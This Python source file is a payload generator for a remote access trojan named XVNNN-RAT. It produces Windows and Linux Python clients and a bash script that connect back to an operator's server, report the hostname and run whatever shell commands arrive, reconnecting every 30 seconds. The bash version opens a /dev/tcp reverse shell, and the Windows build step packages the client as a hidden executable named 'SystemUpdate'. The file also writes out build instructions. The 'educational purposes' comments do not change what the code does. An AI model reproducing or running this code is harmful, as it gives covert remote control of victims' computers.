"""
Payload Generator for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import os
import sys
import base64
import logging

logger = logging.getLogger(__name__)


class PayloadGenerator:
    """Generate payloads for multiple operating systems"""

    def __init__(self):
        self.name = "payload_generator"

    def generate_windows_payload(self, server_ip, server_port, output_format="py"):
        """Generate Windows payload"""
        payload_code = f'''import socket
import json
import subprocess
import threading
import time

def receive_json(sock, max_size=10485760):  # 10MB limit
    """Receive JSON data from socket with size limit to prevent DoS"""
    try:
        data = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > max_size:
                return None
            if b'\\n' in chunk:
                break
        
        if not data:
            return None
            
        data = data.strip()
        if not data:
            return None
            
        return json.loads(data.decode('utf-8'))
    except Exception:
        return None

def run_client():
    server_ip = "{server_ip}"
    server_port = {server_port}
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((server_ip, server_port))
            
            info = {{
                "type": "info",
                "os": "Windows",
                "hostname": socket.gethostname()
            }}
            s.send(json.dumps(info).encode() + b'\\n')
            
            while True:
                try:
                    msg = receive_json(s)
                    if not msg:
                        break
                    if msg.get("type") == "shell":
                        cmd = msg.get("command", "")
                        # Basic validation
                        if len(cmd) > 10000:
                            continue
                        result = subprocess.run(cmd, shell=True, capture_output=True, 
                                              text=True, timeout=30, encoding='cp437', errors='replace')
                        output = result.stdout + result.stderr
                        response = {{"type": "shell", "output": output}}
                        s.send(json.dumps(response).encode() + b'\\n')
                except:
                    pass
            s.close()
        except:
            time.sleep(30)

if __name__ == "__main__":
    run_client()
'''

        if output_format == "py":
            return payload_code
        elif output_format == "exe":
            return {
                "code": payload_code,
                "build_command": f'pyinstaller --onefile --noconsole --name "SystemUpdate" payload.py',
                "description": "PyInstaller command to create executable",
            }

    def generate_linux_payload(self, server_ip, server_port, output_format="py"):
        """Generate Linux payload"""
        payload_code = f'''import socket
import json
import subprocess
import threading
import time
import shlex

def receive_json(sock, max_size=10485760):  # 10MB limit
    """Receive JSON data from socket with size limit to prevent DoS"""
    try:
        data = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > max_size:
                return None
            if b'\\n' in chunk:
                break
        
        if not data:
            return None
            
        data = data.strip()
        if not data:
            return None
            
        return json.loads(data.decode('utf-8'))
    except Exception:
        return None

def run_client():
    server_ip = "{server_ip}"
    server_port = {server_port}
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((server_ip, server_port))
            
            info = {{
                "type": "info",
                "os": "Linux",
                "hostname": socket.gethostname()
            }}
            s.send(json.dumps(info).encode() + b'\\n')
            
            while True:
                try:
                    msg = receive_json(s)
                    if not msg:
                        break
                    if msg.get("type") == "shell":
                        cmd = msg.get("command", "")
                        # Basic validation
                        if len(cmd) > 10000:
                            continue
                        # Safer execution using shlex
                        args = shlex.split(cmd)
                        result = subprocess.run(args, shell=False, capture_output=True, 
                                              text=True, timeout=30, encoding='utf-8', errors='replace')
                        output = result.stdout + result.stderr
                        response = {{"type": "shell", "output": output}}
                        s.send(json.dumps(response).encode() + b'\\n')
                except:
                    pass
            s.close()
        except:
            time.sleep(30)

if __name__ == "__main__":
    run_client()
'''

        if output_format == "py":
            return payload_code
        elif output_format == "elf":
            return {
                "code": payload_code,
                "build_command": f"python3 -m py_compile payload.py && chmod +x payload.pyc",
                "description": "Compile to bytecode",
            }

    def generate_shell_script(self, server_ip, server_port):
        """Generate shell script payload (Note: Shell scripts with command execution are inherently insecure)"""
        # WARNING: This is provided for educational purposes only
        # In a real scenario, use Python payloads instead of shell scripts for better security
        script = f'''#!/bin/bash
# XVNNN-RAT Payload - Shell Script Version
# WARNING: For educational purposes only. Use Python payloads for better security.
SERVER_IP="{server_ip}"
SERVER_PORT={server_port}

# Safer command execution function
execute_command() {{
    local cmd="$1"
    # Basic validation - reject dangerous patterns
    if [[ "$cmd" =~ (rm -rf|format c:|del /f|shutdown|reboot) ]]; then
        echo "Command blocked for security"
        return
    fi
    
    # Use timeout and limit execution time
    timeout 30s bash -c "$cmd" 2>&1 || echo "Command timed out or failed"
}}

while true; do
    exec 3<>/dev/tcp/$SERVER_IP/$SERVER_PORT
    if [ $? -eq 0 ]; then
        echo "{{\\"type\\":\\"info\\",\\"os\\":\\"Linux\\",\\"hostname\\":\\"$(hostname)\\"}}" >&3
        while read -r line <&3; do
            cmd=$(echo "$line" | python3 -c "import sys, json; print(json.load(sys.stdin).get('command', ''))" 2>/dev/null)
            if [ -n "$cmd" ]; then
                output=$(execute_command "$cmd")
                echo "{{\\"type\\":\\"shell\\",\\"output\\":\\"$output\\"}}" >&3
            fi
        done
    fi
    sleep 30
done
'''
        return script

    def generate_all_payloads(self, server_ip, server_port, output_dir=None):
        """Generate all payload types"""
        if output_dir is None:
            output_dir = os.path.join(os.getcwd(), "payloads")

        os.makedirs(output_dir, exist_ok=True)

        payloads = {
            "windows_py.py": self.generate_windows_payload(
                server_ip, server_port, "py"
            ),
            "linux_py.py": self.generate_linux_payload(server_ip, server_port, "py"),
            "shell.sh": self.generate_shell_script(server_ip, server_port),
        }

        created_files = []
        for filename, content in payloads.items():
            filepath = os.path.join(output_dir, filename)
            with open(filepath, "w") as f:
                f.write(content)
            created_files.append(filename)

        # Create build instructions
        instructions = """
=== XVNNN-RAT Payload Generator - Build Instructions ===

1. Windows Python Payload:
   - Save as payload.py
   - Build with: pyinstaller --onefile --noconsole payload.py

2. Linux Python Payload:
   - Save as payload.py
   - Run with: python3 payload.py

3. Shell Script:
   - Save as payload.sh
   - Make executable: chmod +x payload.sh
   - Run: ./payload.sh

=== Server Setup ===
Start XVNNN-RAT server:
  python3 src/server/headless.py
"""

        with open(os.path.join(output_dir, "BUILD_INSTRUCTIONS.txt"), "w") as f:
            f.write(instructions)

        return {
            "status": "success",
            "output_dir": output_dir,
            "payloads": created_files,
            "server_ip": server_ip,
            "server_port": server_port,
            "instructions": instructions,
        }
